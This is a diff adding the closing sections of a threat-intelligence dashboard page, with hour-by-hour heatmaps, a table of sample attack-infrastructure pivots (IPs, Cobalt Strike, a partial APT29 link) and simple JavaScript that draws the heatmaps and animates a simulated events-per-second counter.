+  <div class="grid-2 mb-16">
+    <div class="card">
+      <div class="card-title">🌡 Telemetry Volume Heatmap — 24h (Events/hour)</div>
+      <div style="font-size:10px;color:var(--text2);margin-bottom:8px">UTC 00:00 → 23:59 — Spike at 03:14 corresponds to active campaign ingress</div>
+      <div class="heatmap" id="hm-volume"></div>
+      <div style="display:flex;gap:8px;margin-top:8px;align-items:center;font-size:9px;color:var(--text2)">
+        LOW <div style="width:12px;height:12px;background:rgba(0,212,255,0.2);border-radius:2px"></div>
+        <div style="width:12px;height:12px;background:rgba(0,212,255,0.4);border-radius:2px"></div>
+        <div style="width:12px;height:12px;background:rgba(255,152,0,0.5);border-radius:2px"></div>
+        <div style="width:12px;height:12px;background:rgba(255,68,68,0.6);border-radius:2px"></div>
+        <div style="width:12px;height:12px;background:var(--red);border-radius:2px"></div> HIGH
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title">🌡 ATT&CK Technique Activity Heatmap — 24h</div>
+      <div style="font-size:10px;color:var(--text2);margin-bottom:8px">ATT&CK technique hit frequency by hour</div>
+      <div class="heatmap" id="hm-attck"></div>
+    </div>
+  </div>
+</div>
+
+<!-- GRAPH EVENTS PAGE -->
+<div class="page" id="page-graph">
+  <div class="card mb-16">
+    <div class="card-title">🕸 Graph Event Stream — Infrastructure Pivots</div>
+    <table class="tbl">
+      <thead><tr><th>Time</th><th>Source Node</th><th>Pivot Type</th><th>Target Node</th><th>Confidence</th><th>Graph Evidence</th></tr></thead>
+      <tbody>
+        <tr><td class="mono text2">03:47:01</td><td class="mono" style="color:var(--red)">185.220.101.47</td><td><span class="chip chip-red">C2 Cluster</span></td><td class="mono" style="color:var(--orange)">185.220.101.82</td><td class="mono" style="color:var(--green)">94%</td><td style="font-size:10px;color:var(--text2)">Shared TLS cert + JARM + ASN47447</td></tr>
+        <tr><td class="mono text2">03:45:22</td><td class="mono" style="color:var(--orange)">192.168.1.47</td><td><span class="chip chip-orange">Lateral Hop</span></td><td class="mono" style="color:var(--yellow)">192.168.1.103</td><td class="mono" style="color:var(--yellow)">81%</td><td style="font-size:10px;color:var(--text2)">SMB auth chain + process lineage</td></tr>
+        <tr><td class="mono text2">03:42:17</td><td class="mono" style="color:var(--yellow)">svchost32.exe</td><td><span class="chip chip-cyan">Malware Cluster</span></td><td class="mono" style="color:var(--cyan)">Cobalt Strike</td><td class="mono" style="color:var(--green)">97%</td><td style="font-size:10px;color:var(--text2)">PE hash, JARM, beacon timing overlap</td></tr>
+        <tr><td class="mono text2">03:38:44</td><td class="mono" style="color:var(--cyan)">APT-CLUSTER-7</td><td><span class="chip chip-purple">Actor Link</span></td><td class="mono" style="color:var(--purple)">APT29 (partial)</td><td class="mono" style="color:var(--orange)">62%</td><td style="font-size:10px;color:var(--text2)">TTP overlap 0.68 + infra overlap 0.41</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+</main>
+</div>
+
+<script>
+function showPage(id) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.sb-item').forEach(s => s.classList.remove('active'));
+  const p = document.getElementById('page-' + id);
+  if (p) p.classList.add('active');
+  document.querySelectorAll('.nav-tab').forEach(t => { if (t.getAttribute('onclick')?.includes(id)) t.classList.add('active'); });
+  document.querySelectorAll('.sb-item').forEach(s => { if (s.getAttribute('onclick')?.includes(id)) s.classList.add('active'); });
+}
+
+function buildHeatmap(id, pattern) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  pattern.forEach((v, i) => {
+    const c = document.createElement('div');
+    c.className = `hm-cell hm-${v}`;
+    c.title = `Hour ${String(i).padStart(2,'0')}:00 UTC`;
+    el.appendChild(c);
+  });
+}
+
+function animateTelemetry() {
+  const el = document.getElementById('eps');
+  const kpi = document.getElementById('kpi-eps');
+  const v = 2847 + Math.floor(Math.random() * 200 - 100);
+  if (el) el.textContent = v.toLocaleString();
+  if (kpi) kpi.textContent = v.toLocaleString();
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+  buildHeatmap('hm-volume', [1,1,0,5,4,3,2,1,1,2,1,2,2,3,2,3,4,2,1,1,2,1,1,0]);
+  buildHeatmap('hm-attck',  [0,0,0,4,5,3,1,0,1,1,0,1,2,2,1,2,3,1,0,0,1,0,0,0]);
+  setInterval(animateTelemetry, 2500);
+});
+buildHeatmap('hm-volume', [1,1,0,5,4,3,2,1,1,2,1,2,2,3,2,3,4,2,1,1,2,1,1,0]);
+buildHeatmap('hm-attck',  [0,0,0,4,5,3,1,0,1,1,0,1,2,2,1,2,3,1,0,0,1,0,0,0]);
+setInterval(animateTelemetry, 2500);
+</script>
+</body>
+</html>
